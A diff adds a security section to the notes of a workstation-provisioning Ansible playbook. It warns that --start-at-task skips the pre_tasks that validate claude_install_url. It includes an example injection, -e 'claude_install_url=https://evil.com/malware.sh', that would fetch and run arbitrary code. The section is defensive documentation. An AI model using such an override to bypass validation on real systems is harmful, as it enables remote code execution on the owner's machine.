@@ -54,6 +54,30 @@ This is a personal workstation provisioning playbook. Security-relevant areas:
   i3 via xss-lock + i3lock, Sway via swayidle + swaylock at 300s lock /
   600s display off)
 
+## Ansible Playbook Safety
+
+**Do NOT use `--start-at-task` with site.yml** — Ansible's `--start-at-task` flag
+skips all `pre_tasks` in the target play, including critical security validations.
+Play 2 (`User setup`) includes preflight checks that validate `claude_install_url`
+is constrained to safe domains (https://claude.ai or https://anthropic.com). Using
+`--start-at-task` with any task name would bypass this validation, allowing
+`-e 'claude_install_url=https://evil.com/malware.sh'` to inject and execute
+arbitrary code. **Workaround:** run `make all` (full provisioning) or `make minimal`
+instead. If you must re-run a subset of tasks:
+
+```bash
+# SAFE: Run from a specific role tag (full play pre_tasks still execute)
+ansible-playbook site.yml -t dotfiles,repos
+
+# UNSAFE: Skips all pre_tasks, including security validations
+# DO NOT USE:
+ansible-playbook site.yml --start-at-task 'Some Task Name'
+```
+
+Defense-in-depth: the `claude` role re-validates `claude_install_url` before
+download (line 6-17 in roles/claude/tasks/main.yml), so even `--start-at-task`
+bypasses cannot reach RCE without also modifying the role's validation.
+
 ## Known Limitations
 
 - **Bluetooth enabled (CIS RHEL 9 2.1.5)** — CIS 2.1.5 recommends disabling
